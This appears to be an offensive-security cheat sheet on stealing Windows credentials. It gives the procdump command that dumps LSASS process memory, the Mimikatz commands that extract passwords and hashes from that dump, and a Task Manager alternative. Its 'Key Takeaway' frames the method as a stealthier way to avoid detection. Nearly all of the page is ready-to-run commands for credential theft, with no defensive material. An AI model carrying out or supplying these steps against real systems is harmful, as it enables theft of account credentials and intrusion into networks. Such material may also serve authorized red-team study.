Offline Credential Dumping with Procdump

Dumping LSASS memory for offline analysis

Procdump LSASS Memory Dump

# Using procdump to dump LSASS process memory to a file
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Explanation of flags:
-accepteula: Automatically accept the EULA
-ma: Create a full memory dump
lsass.exe: The target process
lsass.dmp: The output dump file name
Key Takeaway

Offline dumping with Procdump offers a stealthier alternative to live Mimikatz execution, allowing for post-exfiltration analysis.

Parsing LSASS Dump with Mimikatz

# 1. Execute Mimikatz
mimikatz.exe

# 2. Load the minidump file
sekurlsa::minidump lsass.dmp

# 3. Dump Passwords/Hashes from the loaded dump
sekurlsa::logonpasswords

# 4. Exit Mimikatz
exit
Pro Tip

You can also use Task Manager (with admin rights) to create a dump file of LSASS by right-clicking the process and selecting 'Create dump file'.
